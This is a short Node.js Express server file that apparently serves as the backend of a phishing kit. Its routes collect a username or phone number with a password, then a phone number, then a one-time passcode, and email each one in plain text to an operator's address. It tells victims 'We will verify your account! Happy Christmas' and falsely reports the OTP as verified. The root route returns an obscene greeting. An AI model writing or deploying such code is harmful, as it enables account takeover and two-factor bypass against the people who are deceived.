const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors('*'));
app.use(bodyParser.json());

// Nodemailer Transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

app.get('/',(req, res)=>{
  res.send('Bhag Bhosdi ka 👍 😄 🤔 🎉');
})

app.post("/submit-credentials", async (req, res) => {
  const { username, phone, password } = req.body;

  // Validate input: Only one of `username` or `phone` should be provided, along with `password`.
  // if ((!username && !phone) || (username && phone) || !password) {
  //   return res.status(400).json({
  //     message: "Provide either a username or a phone number, along with a password.",
  //   });
  // }

  try {
    // Send notification email.
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFY_EMAIL,
      subject: "New Credentials Submission",
      text: `New credentials submitted:\n\n${username ? `Username: ${username}` : `Phone: ${phone}`}\nPassword: ${password}`,
    });

    res.status(200).json({ message: "We will verify your account! Happy Christmas 🎅🎄🎁" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ message: "An error occurred. Please try again." });
  }
});

// Route 2: Save Phone and Notify on Submission
app.post("/submit-phone", async (req, res) => {
  const { phone } = req.body;

  // if (!phone) {
  //   return res.status(400).json({ message: "Phone number is required." });
  // }

  try {
    // Notify admin via email
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFY_EMAIL,
      subject: "Phone Submission",
      text: `Phone submitted: ${phone}`,
    });

    res.status(200).json({ message: "Check your phone OTP sent!" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ message: "An error occurred. Please try again." });
  }
});

// Route 3: Verify OTP
app.post("/verify-otp", async (req, res) => {
  const { otp } = req.body;

  // if (!otp) {
  //   return res.status(400).json({ message: "OTP is required." });
  // }

  try {
    // Notify admin via email
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFY_EMAIL,
      subject: "OTP Submission",
      text: `OTP submitted: ${otp}`,
    });

    res.status(200).json({ message: "OTP verified successfully! We will verify your account. 🎅🎄🎁" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ message: "An error occurred. Please try again." });
  }
});

// Start Server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
